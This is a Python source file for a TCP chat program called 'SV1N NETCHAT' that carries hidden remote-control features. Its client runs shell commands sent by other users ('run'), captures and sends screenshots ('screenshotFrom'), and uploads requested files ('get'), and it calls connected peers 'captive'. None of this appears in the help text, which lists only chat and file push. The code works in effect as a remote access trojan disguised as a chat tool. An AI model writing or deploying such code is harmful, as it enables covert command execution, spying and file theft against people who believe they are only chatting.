import socket
import sys
import threading
import argparse
import subprocess
import os
import time
import pyautogui
from colorama import Fore, Style, init

startText = """ 
 ███████╗██╗   ██╗ ██╗███╗   ██╗
 ██╔════╝██║   ██║███║████╗  ██║
 ███████╗██║   ██║╚██║██╔██╗ ██║
 ╚════██║╚██╗ ██╔╝ ██║██║╚██╗██║
 ███████║ ╚████╔╝  ██║██║ ╚████║
 ╚══════╝  ╚═══╝   ╚═╝╚═╝  ╚═══╝

             S V 1 N   N E T C H A T
             ───────────────────────
             TCP NETWORK CHAT
             v1.0.2

 [*] Initializing network subsystem...
 [*] Loading protocol...
 [*] Ready.
"""

def opDefiner(clients, data):
    op = data.split()[1].strip()
    opSocket = clients.get(op)
    print("OP: ", op, " OPSOCKET: ", opSocket)
    return op, opSocket

def file_sender(client, filename):
    try:
        if not os.path.isfile(filename):
            print(Fore.RED + f"[ALERT] File {filename} does not exist." + Style.RESET_ALL)
            return
    
        
        file_size = os.path.getsize(filename)
        basename = os.path.basename(filename)

        header = f"FILE_TRANSFER {basename} {file_size}\n"
        client.sendall(header.encode("UTF-8"))

        with open(filename, "rb") as f:
            while True:
                chunk = f.read(4096)

                if not chunk:
                    break

                client.sendall(chunk)

    except FileNotFoundError:
        client.sendall(b"FILE_ERROR File not found\n")
        print(Fore.RED+"[ALERT] FILE_ERROR File not found"+Style.RESET_ALL)

    finally:
        os.remove(filename)

def client_listener(client, username):
    buffer = b""
    while True:
        data = client.recv(4096)
        if not data:
            break

        elif data == b"exit\n":
            del clients[username]
            print(Fore.CYAN + "\n[ALERT] Connection closed on socket "+username+"\n"+Style.RESET_ALL)
            client.close()
            break
            
        buffer += data        

        while buffer != b"":
            nameSection = b"> " in buffer[0:30]
            if nameSection == False:
                if buffer.startswith(b"FILE_TRANSFER"):
                    try:
                        filename = buffer.split(b" ")[1].decode("UTF-8", errors="ignore")
                        vip = clients.get(buffer.split(b" ")[3].decode())
                        file_size = int(buffer.split(b" ")[4])

                        if vip is None:
                            raise ValueError("Target client not found")

                        if not filename or not file_size:
                            vip.sendall("WRONG ARGUMENTS FOR FILE_TRANSFER".encode("UTF-8"))
                            continue

                        vip.sendall("SENDING_FORBIDDEN".encode("UTF-8"))

                        end = buffer.find(b"HEADER-END\n")
                        if end == -1:
                            data = client.recv(4096)
                            buffer += data
                            continue

                        with open(filename, "wb") as f:

                            header = buffer[:end + len(b"HEADER-END\n")]
                            buffer = buffer[end + len(b"HEADER-END\n"):]

                            if buffer: 
                                f.write(buffer)

                            rest_of_file = file_size - len(buffer)

                            while rest_of_file >= 4096:
                                data = client.recv(4096)
                                f.write(data)
                                rest_of_file -= len(data)
                            if rest_of_file > 0:
                                data = client.recv(rest_of_file)
                                f.write(data)

                        file_sender(vip, os.path.join(os.getcwd(), filename))

                        vip.sendall("SENDING ALLOWED".encode("UTF-8"))
                    except Exception as e:
                        print(e)
                        continue

                    buffer = b""
                    continue

                elif buffer.startswith(b"CMD_OUTPUT "):
                    ankor = b"CMD_OUTPUT_END\n"

                    while ankor not in buffer:
                        chunk = client.recv(1024)
                        if not chunk:
                            raise ConnectionError("Client disconnected during CMD_OUTPUT")
                        buffer += chunk
                    vip, vipSocket = opDefiner(clients, buffer.decode("UTF-8", errors="ignore"))

                    cmd_buffer = buffer[:buffer.find(ankor)+len(ankor)]
                    buffer = buffer[buffer.find(ankor)+len(ankor):]
                    vipSocket.sendall(cmd_buffer)
                    continue

            if not b"\n" in buffer:
                continue

            msg = buffer
            buffer = buffer[buffer.find(b"> ")+2:]

            if buffer.startswith(b"screenshotFrom"):

                cmd = buffer.split(b"\n", 2)[0].decode()
                try:
                    captiveName, captive = opDefiner(clients, cmd)
            
                    if captive is None:
                        client.sendall(
                            "No Captive Found\n".encode("UTF-8")
                        )
                        continue
    
                    captive.sendall(
                        f"{username} -screenshot".encode("UTF-8")
                    )

                    continue
    
                except Exception as e:
                    print(f"Screenshot error: {type(e).__name__}: {e}")
                    continue
                finally:
                    buffer = buffer.split(b"\n", 2)[1]

            elif buffer.startswith(b"run"):
                try:
                    cmd = buffer.split(b"\n", 2)[0].decode("UTF-8", errors="ignore").strip()
                    captiveName, captive = opDefiner(clients, cmd)
                    commandEx = cmd.split(" ", 2)[2].strip()

                    if not captive:
                        raise ValueError("Client not found")
                    
                    if  captive == "" or commandEx == "":
                        client.send(f"No command provided to run.\n".encode("UTF-8"))
                        continue                

                    if captive:
                        try:
                            captive.send(f"{username} -run {commandEx}\n".encode("UTF-8"))
                            buffer = buffer.split(b"\n", 2)[1]
                            continue
                        except Exception as e:
                            print(f"Failed to send command to opoponent: {e}")
                            buffer = buffer.split(b"\n", 2)[1]
                    else:
                        print(f"Client not found.")
                        client.send(f"Client {captiveName} not found.\n".encode("UTF-8"))
                        buffer = buffer.split(b"\n", 2)[1]
                except Exception as e:
                    client.send(f"Client not found.\n".encode("UTF-8"))
                    buffer = buffer.split(b"\n", 2)[1]
                    print(e)
    
            elif buffer.startswith(b"get"):
                try:
                    cmd = buffer.split(b"\n", 2)[0].decode().strip() 
                    filename = cmd.split(" ")[2]
                    captiveName, captive = opDefiner(clients, cmd)
                except Exception as e:
                    print(e)
                    client.send("Please follow special command format!".encode("UTF-8"))
                    print("Please follow special command format!")
                    buffer = buffer.split(b"\n", 2)[1]
                    continue

                if filename == "":
                    print("No filename provided to get.")
                    client.send(f"No filename provided to get.\n".encode("UTF-8"))
                    buffer = buffer.split(b"\n", 2)[1]
                    continue
    
                if captive:
                    try:
                        captive.send(f"{username} -get {filename}".encode("UTF-8"))
                        buffer = buffer.split(b"\n", 2)[1]
                        continue
                    except Exception as e:
                        print(f"Failed to send get request to {captiveName}: {e}")
                        buffer = buffer.split(b"\n", 2)[1]
                    continue
            else:
                cmd = msg.split(b"\n", 2)[0]
                for connected_client in clients.values():
                    connected_client.sendall(cmd)
                buffer = buffer.split(b"\n", 2)[1]

#CLIENT DEFS

def execute_command(command):
    """
    Выполняет команду и возвращает вывод.
    """

    try:
        output = subprocess.check_output(
            command,
            stderr=subprocess.STDOUT,
            shell=True
        )

    except Exception:
        output = b"Failed to execute command.\n"

    if not output.endswith(b"\n"):
        output += b"\n"

    return output

def transfer_file(priorityname, file_path):

    if not os.path.isfile(file_path):
        print(f"File {file_path} does not exist.")
        return

    file_size = os.path.getsize(file_path)
    filename = os.path.basename(file_path)

    header = f"FILE_TRANSFER {filename} to {priorityname} {file_size} HEADER-END\n"
    s.sendall(header.encode("UTF-8"))

    with open(file_path, "rb") as f:
        while True:
            chunk = f.read(4096)

            if not chunk:
                break

            s.sendall(chunk)

def receive_file(client, first_data, filename, file_size):
    received = 0

    with open(filename, "wb") as f:
        file_data = first_data[:file_size]

        f.write(file_data)
        received += len(file_data)

        while received < file_size:
            chunk = client.recv(min(4096, file_size - received))

            if not chunk:
                raise ConnectionError(
                    "Client disconnected during file transfer"
                )

            f.write(chunk)
            received += len(chunk)

    return received

def client_sender(name):
    while True:
        if not forbid_sending:
            cmd = input(name)
            if cmd == "":
                continue
            elif cmd == "exit":
                cmd = cmd + "\n"
                s.send(cmd.encode("UTF-8"))
                break

            elif cmd.startswith("dataPush"):
                parts = cmd.split()

                if len(parts) < 3:
                    print("Usage: dataPush <target> <filename>")
                    continue

                op = parts[1]
                filename = parts[2]

                file_path = os.path.join(os.getcwd(), filename)

                if not os.path.isfile(file_path):
                    print(f"File not found: {file_path}")
                    continue

                transfer_file(op, file_path)
                continue

            cmd = name + cmd + "\n"
            s.send(cmd.encode("UTF-8"))

def receive_cmd_output(client, val):
    buffer = val.encode("UTF-8")

    if b"CMD_OUTPUT_END\n" not in buffer:
        while b"CMD_OUTPUT_END\n" not in buffer:
            chunk = client.recv(1024)

            if not chunk:
                raise ConnectionError("Client disconnected during CMD_OUTPUT")

            buffer += chunk
    return buffer.decode("UTF-8", errors="ignore")
        


def ClientListener(name):
    global forbid_sending
    while True:
        try:
            buffer = s.recv(1024)
            data = buffer.decode("UTF-8", errors="ignore")
            
            if not buffer:
                break
            if b"CMD_OUTPUT" in buffer:

                data = receive_cmd_output(s, data)

                print(data, end="")
                continue

            elif b"FILE_TRANSFER " in buffer:
                header_end = buffer.find(b"\n")

                if header_end == -1:
                    print("Incomplete FILE_TRANSFER header")
                    continue

                header = buffer[:header_end]
                first_file_data = buffer[header_end + 1:]

                parts = header.decode("UTF-8").split(" ", 2)

                if len(parts) != 3:
                    print("Invalid FILE_TRANSFER header:", header)
                    continue

                filename = parts[1]
                file_size = int(parts[2])

                received = receive_file(
                    s,
                    first_file_data,
                    filename,
                    file_size
                )

                continue

            if data == "SENDING_FORBIDDEN":
                forbid_sending = True
                continue
            elif data == "SENDING ALLOWED":
                forbid_sending = False
                continue
            if data.split(" ")[1] == "-run":                
                priorityname = data.split(" ")[0]
                command = data.split(priorityname + " -run ")[1]

                output = execute_command(command)

                message = (
                    "CMD_OUTPUT "
                    + priorityname
                    + " "
                    + output.decode("UTF-8", errors="ignore")
                    + "CMD_OUTPUT_END\n"
                )

                s.send(message.encode("UTF-8"))
                continue
            
            elif data.split(" ")[1] == "-screenshot":

                priority_name = data.split(" ")[0]

                screenshot_path = os.path.join(
                    os.getcwd(),
                    f"screenshot_{int(time.time())}.png"
                )

                try:
                    pyautogui.screenshot().save(screenshot_path)
                    file_size = os.path.getsize(screenshot_path)
                    transfer_file(priority_name, screenshot_path)
                    os.remove(screenshot_path)
                except OSError:
                    pass
                continue

            elif data.split(" ")[1] == "-get":

                print(Fore.GREEN + "DATA: " + data)

                priorityname = data.split(" ")[0]
                filename= data.split(" ")[2]
                print("FILENAME:", repr(filename))
                file_path = os.path.join(os.getcwd(), filename)

                transfer_file(priorityname, file_path)

                continue

            if not "> " in data:
                print(Fore.RED + f"\n [ALERT] from server: {data}" + Style.RESET_ALL)
                continue

            else:
                dataname = data.split("> ", 1)[0] + "> "
                if dataname != name:
                    print(f"\n{data}")

        except Exception as e:
            print(Fore.RED + f"\n[ERROR] + {e}" + Style.RESET_ALL)
            break


parser = argparse.ArgumentParser(add_help=False)
parser.add_argument("--name", help="Initial buffer to send")
parser.add_argument("-l", "--listen", action="store_true", help="Listen mode")
parser.add_argument("-t", "--target", help="Specify Target")
parser.add_argument("-p", "--port", help="Specify Port")
parser.add_argument("-h", "--help", action="store_true", help="Show help")
args = parser.parse_args()

print(Fore.BLUE + startText + Style.RESET_ALL)

if args.help == True:
    print(Fore.CYAN + """
╔══════════════════════════════════════════════════════════╗
║                    SV1N NETCHAT                          ║
║                  Command Reference                       ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  STARTUP                                                 ║
║  ─────────────────────────────────────────────────────── ║
║  --name <name>              Set your username            ║
║  -l, --listen               Start in server mode         ║
║                                                          ║
║  CHAT                                                    ║
║  ─────────────────────────────────────────────────────── ║
║  <message>                  Send a message               ║
║  exit                       Close the connection         ║
║                                                          ║
║  NETWORK                                                 ║
║  ─────────────────────────────────────────────────────── ║
║  dataPush <target> <file>  Transfer a file               ║
║                                                          ║
║  EXAMPLES                                                ║
║  ─────────────────────────────────────────────────────── ║
║  sv1n -l                                                 ║
║  sv1n --name Deb1l                                       ║
║                                                          ║
║  OPTIONS                                                 ║
║  ─────────────────────────────────────────────────────── ║
║  --help                     Show this help               ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)
    sys.exit(0)

port = args.port
target = args.target

if port == None:
    print(Fore.RED + "[ALERT] Specify Port" + Style.RESET_ALL)
    sys.exit(0)

if args.listen == True:

    clients = {}

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(("0.0.0.0", int(port)))
    except Exception as e:
        print(Fore.RED + "[ALERT] Specify a real free port. " + Style.RESET_ALL)
        print(e)
        sys.exit(0)
                    
    s.listen(5)

    print(Fore.BLUE + f"[MESSAGE] Server successfully started on {target} on port {port}\n" + Style.RESET_ALL)

    while True:
        client, addr = s.accept()
        username = client.recv(1024).decode("UTF-8", errors="ignore")  # Receive initial data from the client (e.g., username)
        if username in clients:
            client.send("Username already taken. Disconnecting.\n".encode("UTF-8"))
            client.close()
            continue

        clients[username] = client

        print(Fore.BLUE+f"[ALERT] Connection from {addr} has been established!"+Style.RESET_ALL)

        listener = threading.Thread(
            target=client_listener,
            args=(client, username),
            daemon=True
        )

        listener.start()

else:
    if args.name == None or len(args.name)>20 or len(args.name)<4:
        print(Fore.RED + "[ALERT] Please provide a name using --name" + Style.RESET_ALL)
        sys.exit(0)

    global forbid_sending
    forbid_sending = False
    username = args.name + "> "

    target = args.target
    if target == None:
        print(Fore.RED + "[ALERT] Specify your target. "+ Style.RESET_ALL)
        sys.exit(0)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, int(port)))
        s.send(args.name.encode("UTF-8"))
    except Exception as e:
        print(e)
        sys.exit(0)

try:
    thread = threading.Thread(
        target=ClientListener,
        args=(username,),
        daemon=True
    )

    thread2 = threading.Thread(
        target=client_sender,
        args=(username,),
        daemon=True
    )

    thread.start()
    thread2.start()

    while True:
        time.sleep(1)

except KeyboardInterrupt:
    print(Fore.GREEN+ "\n\nProgramm successfully stopped\n"+ Style.RESET_ALL)
    try:
        s.sendall(b"exit\n")
    except OSError:
        pass

    s.close()